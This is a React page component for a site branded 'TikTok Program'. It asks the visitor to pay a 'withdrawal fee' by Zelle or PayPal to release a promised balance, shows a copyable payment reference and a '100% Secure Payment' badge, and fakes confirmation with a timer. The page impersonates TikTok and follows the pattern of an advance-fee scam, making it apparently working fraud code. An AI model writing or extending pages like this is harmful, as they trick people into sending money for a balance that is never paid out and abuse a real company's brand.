import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import { BALANCE_LABEL, FEE_LABEL, getPayment, markPaymentPaid, type Payment } from "@/lib/payments";
import paypalLogo from "@/assets/paypal.svg";
import zelleLogo from "@/assets/zelle.svg";
import tiktokLogo from "@/assets/tiktok.svg";

export const Route = createFileRoute("/payment")({
  validateSearch: (search: Record<string, unknown>) => ({
    ref: (search["ref"] as string) || "",
  }),
  head: () => ({
    title: "Payment Created – TikTok Program",
    meta: [
      {
        name: "description",
        content: "Payment created to release your TikTok Program balance.",
      },
      { property: "og:title", content: "Payment Created – TikTok Program" },
      {
        property: "og:description",
        content: "Payment created to release your TikTok Program balance.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: PaymentPage,
});

function PaymentPage() {
  const navigate = useNavigate();
  const { ref } = Route.useSearch();
  const [payment, setPayment] = useState<Payment | null>(null);
  const [loaded, setLoaded] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    setPayment(getPayment(ref));
    setLoaded(true);
  }, [ref]);

  const copyReference = async () => {
    try {
      await navigator.clipboard.writeText(ref);
      toast.success("Reference copied.");
    } catch {
      toast.error("Unable to copy the reference.");
    }
  };

  const handleConfirm = () => {
    setIsLoading(true);
    // >>> GATEWAY: a confirmação real chega pelo webhook da gateway.
    setTimeout(() => {
      const paid = markPaymentPaid(ref);
      setIsLoading(false);
      if (paid) setPayment(paid);
      toast.success("Payment confirmed! Your withdrawal is being processed.");
      setTimeout(() => navigate({ to: "/" }), 2200);
    }, 2200);
    // <<< GATEWAY
  };

  if (!loaded) {
    return (
      <div className="min-h-screen bg-[#f9f9f9] px-4 pt-8">
        <div className="mx-auto max-w-md">
          <div className="h-[320px] animate-pulse rounded-[20px] border border-[#ebebeb] bg-white" />
        </div>
      </div>
    );
  }

  if (!payment) {
    return (
      <div className="min-h-screen bg-[#f9f9f9] px-4 pt-8">
        <div className="mx-auto max-w-md">
          <div className="rounded-[20px] border border-[#ebebeb] bg-white p-6 text-center shadow-[0_4px_20px_rgba(0,0,0,0.05)]">
            <h1 className="mb-2 text-xl font-black text-[#1a1a2e]">Payment not found</h1>
            <p className="mb-6 text-[14px] text-[#555555]">
              This payment no longer exists. Request a new withdrawal to create another reference.
            </p>
            <button
              onClick={() => navigate({ to: "/withdraw" })}
              className="w-full rounded-[14px] bg-[#ff4d67] p-[16px] text-[16px] font-extrabold text-white shadow-[0_6px_20px_rgba(255,77,103,0.35)] transition-all hover:bg-[#ff3452] active:scale-[0.98]"
            >
              BACK TO WITHDRAWAL
            </button>
          </div>
        </div>
      </div>
    );
  }

  const isPaid = payment.status === "paid";
  const created = new Date(payment.createdAt).toLocaleString("en-US", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });

  return (
    <div className="min-h-screen bg-[#f9f9f9] px-4 pt-8">
      <div className="mx-auto max-w-md">
        <div className="mb-8 flex items-center justify-between">
          <button
            onClick={() => navigate({ to: "/withdraw" })}
            className="text-[14px] font-semibold text-[#555555]"
          >
            ← Back
          </button>
          <div className="flex items-center gap-2">
            <img src={tiktokLogo} alt="TikTok" className="h-6 w-6" />
            <span className="text-lg font-black tracking-tighter text-[#1a1a2e]">TikTok</span>
          </div>
        </div>

        <div className="rounded-[20px] border border-[#ebebeb] bg-white p-6 shadow-[0_4px_20px_rgba(0,0,0,0.05)]">
          <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#fff0f3]">
            <svg width="26" height="26" viewBox="0 0 24 24" fill="#ff4d67">
              <path d="M20 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V6a2 2 0 00-2-2zm0 14H4v-6h16v6zm0-9H4V6h16v3z" />
            </svg>
          </div>

          <h1 className="mb-2 text-center text-xl font-black text-[#1a1a2e]">Payment Created</h1>
          <p className="mb-5 text-center text-[14px] text-[#555555]">
            Use the reference below to complete the withdrawal fee payment.
          </p>

          <div
            className={`mb-5 rounded-[14px] border p-3 text-center ${
              isPaid ? "border-[#bbf7d0] bg-[#f0fdf4]" : "border-[#ffe1a8] bg-[#fff8ec]"
            }`}
          >
            <span
              className={`text-[12px] font-black uppercase tracking-wider ${
                isPaid ? "text-[#15803d]" : "text-[#b45309]"
              }`}
            >
              {isPaid ? "Paid" : "Awaiting payment"}
            </span>
          </div>

          <div className="mb-5 rounded-[14px] border border-[#ebebeb] bg-[#f9f9f9] p-4 text-left">
            <div className="flex items-center justify-between py-1">
              <span className="text-[12px] font-semibold text-[#555555]">Withdrawal fee</span>
              <span className="text-[15px] font-black text-[#ff4d67]">{payment.label}</span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-[12px] font-semibold text-[#555555]">Balance to release</span>
              <span className="text-[13px] font-black text-[#15803d]">{BALANCE_LABEL}</span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-[12px] font-semibold text-[#555555]">Method</span>
              <span className="flex items-center gap-1.5 text-[13px] font-black text-[#1a1a2e]">
                <img
                  src={payment.method === "zelle" ? zelleLogo : paypalLogo}
                  alt={payment.method === "zelle" ? "Zelle" : "PayPal"}
                  className="h-4 w-4 object-contain"
                />
                {payment.method === "zelle" ? "Zelle" : "PayPal"}
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-[12px] font-semibold text-[#555555]">Email</span>
              <span className="max-w-[60%] truncate text-[13px] font-bold text-[#1a1a2e]">
                {payment.email}
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-[12px] font-semibold text-[#555555]">Created on</span>
              <span className="text-[13px] font-bold text-[#1a1a2e]">{created}</span>
            </div>
          </div>

          <button
            type="button"
            onClick={copyReference}
            className="mb-5 flex w-full items-center justify-between gap-3 rounded-[14px] border-2 border-dashed border-[#ff4d67] bg-[#fff0f3] p-4 text-left transition-all hover:bg-[#ffe6eb] active:scale-[0.99]"
          >
            <div className="flex flex-col">
              <span className="text-[11px] font-black uppercase tracking-wider text-[#ff4d67]">
                Reference
              </span>
              <span className="text-[18px] font-black tracking-[0.12em] text-[#1a1a2e]">
                {payment.reference}
              </span>
            </div>
            <span className="text-[11px] font-bold uppercase text-[#ff4d67]">Copy</span>
          </button>

          <button
            type="button"
            onClick={handleConfirm}
            disabled={isLoading || isPaid}
            className="flex w-full items-center justify-center gap-2 rounded-[14px] bg-[#ff4d67] p-[18px] text-[17px] font-extrabold text-white shadow-[0_6px_20px_rgba(255,77,103,0.35)] transition-all hover:bg-[#ff3452] active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60"
          >
            {isLoading ? (
              <div className="h-5 w-5 animate-spin rounded-full border-2 border-white/30 border-t-white" />
            ) : isPaid ? (
              <>PAYMENT CONFIRMED</>
            ) : (
              <>I HAVE MADE THE PAYMENT</>
            )}
          </button>

          <div className="mt-6 flex items-center justify-center gap-2 text-[#999999]">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
            </svg>
            <span className="text-[11px] font-medium uppercase tracking-wider">
              100% Secure Payment
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}
